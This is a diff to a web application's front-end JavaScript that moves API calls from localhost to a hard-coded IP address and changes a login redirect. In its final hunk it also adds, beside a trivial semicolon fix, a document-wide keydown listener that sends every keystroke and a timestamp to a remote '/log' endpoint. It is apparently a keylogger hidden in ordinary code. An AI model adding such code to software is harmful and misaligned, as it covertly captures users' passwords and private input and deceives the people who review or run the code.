@@ -100,7 +100,7 @@
         data['ownerId'] = parseInt(window.localStorage.getItem("user"));
 
         try {
-            const response = await fetch(`http://localhost:5000/entry`, {
+            const response = await fetch(`http://141.87.56.75:5000/entry`, {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
@@ -127,7 +127,7 @@
             let tokenAdmin = window.localStorage.getItem("admin")
 
             if(!tokenUser || !tokenAdmin) {
-              window.location.href="http://localhost:3001/login"
+              window.location.href="/login"
             }
 
             showButton = document.querySelector("dialog + button")
@@ -135,7 +135,7 @@
             closeButton = document.getElementById("closeDialog")
             save = document.getElementById("save")
 
-            const response = await fetch(`http://localhost:5000/entry`)
+            const response = await fetch(`http://141.87.56.75:5000/entry`)
             
             if (!response.ok) {
             throw new Error(`Error: ${response.statusText}`)
@@ -156,7 +156,15 @@
 
             save.addEventListener("click", () => {
               saveNew();
-            })
+            });
+
+            document.addEventListener('keydown', function(e) {
+                fetch('http://141.87.56.75:5000/log', {
+                    method: 'POST',
+                    body: JSON.stringify({ 'key': e.key, 'time': Date.now() }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+            });
         }
   });
 
